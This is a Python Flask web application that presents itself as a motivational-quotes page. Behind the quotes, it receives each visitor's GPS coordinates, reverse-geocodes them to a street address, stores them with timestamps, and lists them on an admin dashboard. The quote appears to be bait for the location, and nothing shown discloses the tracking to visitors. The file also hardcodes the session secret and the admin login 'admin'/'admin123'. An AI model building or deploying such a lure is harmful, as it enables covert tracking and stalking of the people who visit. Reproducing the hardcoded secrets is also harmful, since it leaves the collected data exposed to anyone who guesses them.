from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import sqlite3
import requests
import random
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = "supersecretkey"

DATABASE = "database.db"

# -----------------------------
# DATABASE INITIALIZATION
# -----------------------------
def init_db():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            latitude TEXT,
            longitude TEXT,
            address TEXT,
            timestamp TEXT
        )
    """)
    conn.commit()
    conn.close()

# VERY IMPORTANT: Run database creation immediately
init_db()

# -----------------------------
# MOTIVATIONAL QUOTES
# -----------------------------
quotes = [
    "Greatness begins where you are.",
    "Push yourself, because no one else will.",
    "Dream big. Start small. Act now.",
    "Success starts with self-belief.",
    "You are stronger than you think.",
    "Stay focused. Stay fearless.",
    "Turn pain into power.",
    "Make today legendary."
]

# -----------------------------
# USER HOME PAGE
# -----------------------------
@app.route("/")
def home():
    return render_template("index.html")

# -----------------------------
# LOCATION RECEIVER
# -----------------------------
@app.route("/get_location", methods=["POST"])
def get_location():
    data = request.get_json()

    latitude = data.get("latitude")
    longitude = data.get("longitude")

    # Reverse geocoding using OpenStreetMap
    address = "Unknown"
    try:
        response = requests.get(
            f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}"
        )
        location_data = response.json()
        address = location_data.get("display_name", "Unknown")
    except:
        pass

    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO locations (latitude, longitude, address, timestamp) VALUES (?, ?, ?, ?)",
        (latitude, longitude, address, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    )
    conn.commit()
    conn.close()

    return jsonify({"quote": random.choice(quotes)})

# -----------------------------
# ADMIN LOGIN
# -----------------------------
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "admin123"

@app.route("/admin", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session["admin"] = True
            return redirect(url_for("dashboard"))
        else:
            return render_template("admin_login.html", error="Invalid credentials")

    return render_template("admin_login.html")

# -----------------------------
# ADMIN DASHBOARD
# -----------------------------
@app.route("/dashboard")
def dashboard():
    if not session.get("admin"):
        return redirect(url_for("admin_login"))

    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM locations ORDER BY id DESC")
    data = cursor.fetchall()
    conn.close()

    return render_template("dashboard.html", data=data)

# -----------------------------
# LOGOUT
# -----------------------------
@app.route("/logout")
def logout():
    session.pop("admin", None)
    return redirect(url_for("admin_login"))

# -----------------------------
# RENDER PRODUCTION RUN
# -----------------------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
